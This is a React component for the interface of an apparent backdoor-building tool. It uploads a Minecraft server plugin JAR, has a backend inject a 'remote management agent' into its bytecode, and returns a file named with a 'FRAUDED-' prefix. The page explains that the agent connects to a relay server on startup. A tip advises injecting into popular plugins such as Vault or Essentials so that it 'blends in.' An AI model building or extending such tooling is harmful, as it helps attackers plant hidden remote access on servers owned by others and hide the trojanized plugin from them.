import React, { useState, useRef } from 'react';
import { apiUrl } from '../api';

export default function Injection() {
  const [platform, setPlatform] = useState('paper');
  const [file, setFile] = useState(null);
  const [dragging, setDragging] = useState(false);
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const fileRef = useRef(null);

  const handleDrop = (e) => {
    e.preventDefault();
    setDragging(false);
    const f = e.dataTransfer.files[0];
    if (f && f.name.endsWith('.jar')) setFile(f);
  };

  const handleFileSelect = (e) => {
    const f = e.target.files[0];
    if (f) setFile(f);
  };

  const handleInject = async () => {
    if (!file) return;
    setLoading(true);
    setResult(null);

    const formData = new FormData();
    formData.append('plugin', file);
    formData.append('platform', platform);

    try {
      const res = await fetch(apiUrl('/api/inject'), { method: 'POST', body: formData });
      if (res.ok) {
        const blob = await res.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `FRAUDED-${file.name}`;
        a.click();
        URL.revokeObjectURL(url);
        setResult({ type: 'success', message: `${file.name} patched successfully. Add to your server's plugins folder and restart.` });
      } else {
        const err = await res.json().catch(() => ({ error: 'unknown error' }));
        setResult({ type: 'error', message: err.error || 'injection failed' });
      }
    } catch (err) {
      setResult({ type: 'error', message: `Injection failed: ${err.message}` });
    }
    setLoading(false);
  };

  return (
    <div className="injection-container">
      <div className="injection-card">
        <h2>Plugin Injector</h2>
        <p>
          Upload any Paper, Spigot, or Velocity plugin JAR. A remote management agent
          is embedded directly into the bytecode — the plugin continues working exactly
          as before, now with remote access.
        </p>

        <div className="platform-select">
          <button className={`platform-btn ${platform === 'paper' ? 'active' : ''}`} onClick={() => setPlatform('paper')}>
            Paper / Spigot
          </button>
          <button className={`platform-btn ${platform === 'velocity' ? 'active' : ''}`} onClick={() => setPlatform('velocity')}>
            Velocity
          </button>
        </div>

        <div
          className={`drop-zone ${dragging ? 'dragging' : ''}`}
          onDragOver={(e) => { e.preventDefault(); setDragging(true); }}
          onDragLeave={() => setDragging(false)}
          onDrop={handleDrop}
          onClick={() => fileRef.current?.click()}
        >
          <div className="drop-zone-icon">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
              <polyline points="17 8 12 3 7 8"/>
              <line x1="12" y1="3" x2="12" y2="15"/>
            </svg>
          </div>
          <div className="drop-zone-label">
            {file ? <strong>{file.name}</strong> : 'Drop a plugin JAR here or click to browse'}
          </div>
        </div>
        <input ref={fileRef} type="file" accept=".jar" style={{ display: 'none' }} onChange={handleFileSelect} />

        <button className="inject-btn" onClick={handleInject} disabled={!file || loading}>
          {loading ? 'Processing...' : `Inject into ${file ? file.name : 'plugin'}`}
        </button>

        {result && <div className={`inject-result ${result.type}`}>{result.message}</div>}
      </div>

      <div>
        <div className="injection-card">
          <h2>How it works</h2>
          <p><strong>1.</strong> Upload any plugin JAR</p>
          <p><strong>2.</strong> Choose Paper or Velocity platform</p>
          <p><strong>3.</strong> Click inject — ASM bytecode manipulation adds the agent into <code>onEnable()</code></p>
          <p><strong>4.</strong> Download the modified JAR and place it in your server's plugins folder</p>
          <p><strong>5.</strong> Restart your server — the agent connects automatically</p>
        </div>

        <div className="tip-card">
          <strong>Tip:</strong> Inject into a plugin your server already uses (Vault, Essentials, etc). It blends in naturally.
        </div>

        <div className="tip-card">
          <strong>Server URL:</strong> The agent connects to the configured relay server. Default: <code>ws://localhost:8080/ws</code>
        </div>
      </div>
    </div>
  );
}
